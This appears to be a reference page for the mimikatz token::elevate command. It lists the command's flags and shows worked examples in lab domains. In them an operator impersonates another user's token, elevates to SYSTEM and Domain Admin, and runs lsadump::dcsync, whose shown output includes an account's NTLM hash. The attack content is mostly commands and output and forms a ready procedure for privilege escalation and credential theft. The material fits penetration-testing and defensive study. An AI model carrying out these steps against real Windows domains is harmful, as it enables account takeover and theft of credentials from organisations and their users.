# elevate

`token::elevate` can be used to impersonate a token. By default it will elevate permissions to `NT AUTHORITY\SYSTEM`. It has the following command line arguments:

* `/id`: Impersonate the specified token
* `/process`: Impersonate the token of the running process
* `/user`: Impersonate the token of the specified user
* `/admin`: Impersonate a token of builtin local administrators
* `/domainadmin`: Impersonate a token with Domain Admin privileges
* `/enterpriseadmin`: Impersonate a token with Enterprise Admin privileges
* `/localservice`: `NT AUTHORITY\LOCAL SERVICE` token impersonation
* `/networkservice`: `NT AUTHORITY\NETWORK SERVICE` token impersonation

## Impersonate Token in a New Thread

List current token:

```
mimikatz # token::whoami
 * Process Token : {0;000831c5} 3 F 2396391     SERVER01\tmassie    S-1-5-21-755659916-1915924768-2761631771-1001   (15g,24p)       Primary
 * Thread Token  : no token
```

The output shows:

- The primary (process) token belongs to the current user.
- There is no impersonation (thread) token.

List tokens of user to impersonate:

```
mimikatz # token::list /user:ffast
Token Id  : 0
User name : ffast
SID name  :
 
5332    {0;000563b2} 2 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
4432    {0;000563b2} 2 F 2839551        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
668     {0;00050574} 0 D 329079         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (12g,24p)       Impersonation (Impersonation)
668     {0;000563e4} 2 L 353269         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
800     {0;000563e4} 2 L 456098         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 380750         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
920     {0;000563e4} 2 L 387116         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,01p)       Impersonation (Identification)
920     {0;000563e4} 2 L 436160         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,02p)       Impersonation (Impersonation)
[...]
```

Use a primary token of the target user (one that is linked to a logonsession):

```
mimikatz # token::elevate /id:457263
Token Id  : 457263
User name :
SID name  :
 
5332    {0;000563b2} 2 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
 -> Impersonated !
 * Process Token : {0;000831c5} 3 F 2396391     SERVER01\tmassie    S-1-5-21-755659916-1915924768-2761631771-1001   (15g,24p)       Primary
 * Thread Token  : {0;000563b2} 2 F 3874634     winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Impersonation (Delegation)
```

The output shows:

- The primary (process) token is still the same of the initial user. The `token::elevate` command will not change the primary token.
- There is now a new impersonation (thread) token for the impersonated user. The impersonation level is `delegation`. It's therefore possible to use the token in a new thread and access local and remote resources.
- It's not possible to start a new command (`misc::cmd`) as the impersonated user, because the impersonated token is an impersonation token and no process token.
- All mimikatz commands are now using the impersonation token for new threads.

After impersonating the the user (who is domain admin), it's e.g. possible to use `lsadump::dcsync`:

```
mimikatz # lsadump::dcsync /user:cclear
[DC] 'winattacklab.local' will be the domain
[DC] 'DC1.winattacklab.local' will be the DC server
[DC] 'cclear' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Celaine Clear

** SAM ACCOUNT **

SAM Username         : cclear
User Principal Name  : cclear@winattacklab.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 5/31/2023 6:51:25 AM
Object Security ID   : S-1-5-21-1345929560-157546789-2569868433-1117
Object Relative ID   : 1117

Credentials:
  Hash NTLM: 760ca1371ac4c506d31b5ec1a09f806d
[...]
```

## Other Examples

By default, `token::elevate` elevates to `SYSTEM`:

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

752     {0;000003e7} 0 D 44299          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;002cfce0} 4 F 62374281    hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730  (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 62721950    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

- All mimikatz commands (new threads) are therefore executed as `SYSTEM`.

Elevate to any logged in domain admin:

```
mimikatz # token::elevate /domainadmin
Token Id  : 0
User name :
SID name  : hacklab\Domain Admins

4512    {0;0007212c} 2 D 476947         hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500   (29g,26p)       Primary
 -> Impersonated !
 * Process Token : {0;080fd6c8} 3 F 137701065   hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730
(15g,26p)       Primary
 * Thread Token  : {0;0007212c} 2 D 137785083   hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500
(29g,26p)       Impersonation (Delegation)
```
